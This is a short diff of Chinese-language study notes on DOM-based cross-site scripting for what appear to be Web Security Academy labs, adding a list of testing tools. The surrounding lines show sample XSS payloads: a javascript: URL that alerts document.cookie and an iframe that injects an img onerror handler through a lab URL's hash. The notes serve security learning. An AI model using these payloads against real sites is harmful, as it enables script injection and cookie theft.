@@ -51,3 +51,7 @@ javascript:alert(document.cookie)
 常见的delivery payload by exploit server
 1. 通过iframe触发
 <iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
+
+常用的工具:
+1. DOM Invader
+2. Burp pro active scanner.
